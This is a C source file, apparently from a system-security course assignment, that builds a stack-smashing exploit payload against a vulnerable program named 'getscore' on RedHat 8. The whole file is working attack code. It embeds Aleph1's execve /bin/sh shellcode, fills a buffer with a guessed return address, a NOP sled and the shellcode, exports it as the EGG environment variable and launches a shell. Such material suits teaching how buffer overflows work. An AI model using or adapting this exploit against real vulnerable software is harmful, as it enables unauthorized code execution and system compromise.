#include <stdlib.h>
/* Author: Yasanka Sameera Horwalavithana
 System Security | Assignment 01
 Smash Stack Attack 
 with given ESP
 works only for RedHat 8
 Run: ./exploit_gen_with_esp <ESP Value> <EGG Size> <Offset>
 E.g., ./exploit_gen_with_esp 0xbffff9d0 160 120
 ./getscore "ABC" $EGG
 */

#define NOP 0x90
/*
 Aleph1's Linux shellcode
 from "Smashing the stack for fun and profit",
 Phrack 49, vol 7
 */
char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

void setNOP(char *start, int size){
    char *p = start;
    int i=0;
    while(i<size){
        *p=NOP;
        p+=1;
        i+=1;
    }
    printf("[set] NOP adds.\n");
}

void setRET(char *start, int size, long address){
    long *p = (long *) start;
    int i=0;
    while(i<size){
        *p=address;
        p+=1;
        i+=4;
    }
    printf("[set] RET adds.\n");
    
}

void setShellCode(char *start, int size){
    char *p = start;
    int i=0;
    while(i<size){
        *p=shellcode[i];
        p+=1;
        i+=1;
    }
    printf("[set] shell code.\n");
    
}

void main(int argc, char *argv[]) {
    char *egg, *_p;
    long *p, espaddress, nopaddress;
    int i, eggsize, offset, nopsled;
    
    if(argc>3){
        /* Take the ESP address, when the segmentation fault occurs */
        espaddress  = strtoll(argv[1], NULL, 0);
        printf("Using sp: 0x%x\n", espaddress, espaddress);
        
        /* Take the minimum size for the buffer to place the shell code */
        eggsize  = atoi(argv[2]);
        printf("Using EGG size: %d\n", eggsize);
        
        /* Take the offset to decide the return address */
        offset  = atoi(argv[3]);
        printf("Using offset: %d\n", offset);
    }else{
        printf("Insufficient command line arguments: please provide ESP address, EGG size, and offset\n");
    }
    
    /* Allocate memory for the buffer to place shell code */
    if (!(egg = malloc(eggsize))) {
        printf("[Error] Memory Allocation Failed.\n");
        exit(0);
    }
    
    int shellcode_size=sizeof(shellcode);
    printf("Length of shell code: %d\n", shellcode_size);
    
    
    
    /* Get the return address to place at EIP, to jump to the executable code of shell code */
    nopaddress=espaddress-offset;
    printf("Using address: 0x%x\n", nopaddress);
    
    /* Here, use the NOP sled as half as the buffer size, keeping enough space for the shell code to place */
    nopsled=eggsize/2;
    printf("NOP sled: %d bytes\n",nopsled);
    
    
    /* Assign the return address */
    setRET(egg,eggsize,nopaddress);
    
    /* Assign the NOP at the begining of buffer */
    setNOP(egg,nopsled);
    
    /* Assign the return address after NOP */
    setShellCode(egg + nopsled,strlen(shellcode));
    
    egg[eggsize - 1] = '\0';
    
    memcpy(egg,"EGG=",4);
    putenv(egg);
    system("/bin/bash");
}
